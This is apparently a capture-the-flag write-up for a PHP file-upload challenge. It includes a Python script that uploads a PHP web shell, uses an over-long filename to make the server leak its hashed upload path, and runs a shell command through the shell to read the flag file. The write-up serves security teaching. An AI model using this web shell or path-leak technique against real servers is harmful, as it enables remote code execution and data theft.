## Title

Upload Fun

## Description

## Solution

Once we access the URL we are presented with the following php:

```php
<?php
    if($_SERVER['REQUEST_METHOD'] == "POST"){
        if ($_FILES["f"]["size"] > 1000) {
            echo "file too large";
            return;
        }

        if (str_contains($_FILES["f"]["name"], "..")) {
            echo "no .. in filename please";
            return;
        }

        if (empty($_FILES["f"])){
            echo "empty file";
            return;
        }

        $ip = $_SERVER['REMOTE_ADDR'];
        $flag = file_get_contents("/flag.txt");
        $hash = hash('sha256', $flag . $ip);

        if (move_uploaded_file($_FILES["f"]["tmp_name"], "./uploads/" . $hash . "_" . $_FILES["f"]["name"])) {
            echo "upload success";
        } else {
            echo "upload error";
        }
    } else {
        if (isset($_GET["f"])) {
            $path = "./uploads/" . $_GET["f"];
            if (str_contains($path, "..")) {
                echo "no .. in f please";
                return;
            }
            include $path;
        }

        highlight_file("index.php");
    }
?>

```

We have two endpoints:
- POST request that accepts a file and it verifies the size, name(filters for `..`) and if its empty.
- GET request that accepts parameter `f`, the only thing that stops us from achieving local file inclusion is the function `str_contains($path, "..")` and not knowing the flag 256, because if we do we can upload a web shell and get a shell in the system.

If we try to upload a shell we get:

```py
import requests
import sys
from io import BytesIO

URL = sys.argv[1]

def uploadFile(filename):
    # Your binary string data
    binary_data = b"""
    <?php
        echo system($_GET["cmd"]);
    ?>
    """

    # Create a BytesIO object to simulate a file
    file_object = BytesIO(binary_data)

    # Prepare the files dictionary with filename control
    files = {'f': (filename, file_object)}

    # Send the POST request with the simulated file
    response = requests.post(URL, files=files)

    # print(response.status_code, response.text)
    return response


r = uploadFile('shell.php')
print(r.text)
``` 

We get: `upload success`
Looking at the move_uploaded_file I notice a strange comment: `make sure that the file name not bigger than 250 characters.` [https://www.php.net/manual/en/function.move-uploaded-file.php]()

However in the php page nothing mentions the size of the file name and its added straight to the path.
Lets send multiple characters, after sending more then 191 characters we get the following error message: 
```html
<br />
<b>Warning</b>:  move_uploaded_file(./uploads/331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA): Failed to open stream: File name too long in <b>/var/www/html/index.php</b> on line <b>22</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move &quot;/tmp/phptR3WCz&quot; to &quot;./uploads/331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; in <b>/var/www/html/index.php</b> on line <b>22</b><br />
upload error
```

We found the path, lets inject a normal shell.php and interact with it in `/uploads/331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d_shell.php`.
We get the flag: `https://upload-fun-okntin33tq-ul.a.run.app/uploads/331763d5cb0983f537fb0adcade90717750397b3839c7f844c98eca4ee27fa4d_shell.php?cmd=cat%20/flag.txt`
Flag: `wctf{h0w_d1d_y0u_gu355_th3_f1l3n4me?_7523015134}`
